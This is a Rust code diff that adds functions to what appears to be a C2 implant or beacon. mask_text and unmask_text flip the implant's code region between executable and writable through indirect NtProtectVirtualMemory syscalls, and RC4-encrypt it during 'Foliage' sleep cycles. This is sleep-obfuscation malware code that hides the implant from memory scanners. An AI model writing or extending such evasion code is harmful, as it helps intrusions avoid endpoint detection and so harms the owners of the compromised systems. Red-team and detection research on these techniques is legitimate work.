@@ -181,3 +181,44 @@ pub fn round_trip_selftest(input: &mut [u8]) {
     Rc4::apply_oneshot(&key, input); // encrypt
     Rc4::apply_oneshot(&key, input); // decrypt (same key, fresh cipher)
 }
+
+/// Mask the implant `.text` region in place: flip RX→RW, RC4-encrypt. For use
+/// INSIDE a Foliage chain (sleep.rs steps 2-3 / 8-9), NOT from the beacon
+/// thread synchronously — encrypting the running code page while executing
+/// through it crashes immediately.
+///
+/// # Safety
+/// Caller MUST guarantee the beacon thread is NOT executing within `[base,
+/// base+len)` (it's sleeping through a Foliage cycle). Single-threaded context.
+pub unsafe fn mask_text(base: usize, len: usize, key: &[u8]) {
+    // Flip RX→RW via NtProtectVirtualMemory (indirect syscall).
+    if let Some(rt) = crate::syscalls::global() {
+        let mut b = base;
+        let mut l = len;
+        let mut old: u32 = 0;
+        let _ = unsafe {
+            crate::syscalls::nt_protect_virtual_memory(rt, &mut b, &mut l, 0x04, &mut old)
+        };
+    }
+    // RC4-encrypt the region in place (pure core).
+    let region = unsafe { core::slice::from_raw_parts_mut(base as *mut u8, len) };
+    Rc4::apply_oneshot(key, region);
+}
+
+/// Unmask the implant `.text`: decrypt, then flip RW→RX. Inverse of
+/// [`mask_text`]. MUST run before any code in the region executes.
+///
+/// # Safety
+/// See [`mask_text`]. `key` MUST equal the mask key.
+pub unsafe fn unmask_text(base: usize, len: usize, key: &[u8]) {
+    let region = unsafe { core::slice::from_raw_parts_mut(base as *mut u8, len) };
+    Rc4::apply_oneshot(key, region); // RC4 decrypt == encrypt
+    if let Some(rt) = crate::syscalls::global() {
+        let mut b = base;
+        let mut l = len;
+        let mut old: u32 = 0;
+        let _ = unsafe {
+            crate::syscalls::nt_protect_virtual_memory(rt, &mut b, &mut l, 0x20, &mut old)
+        };
+    }
+}
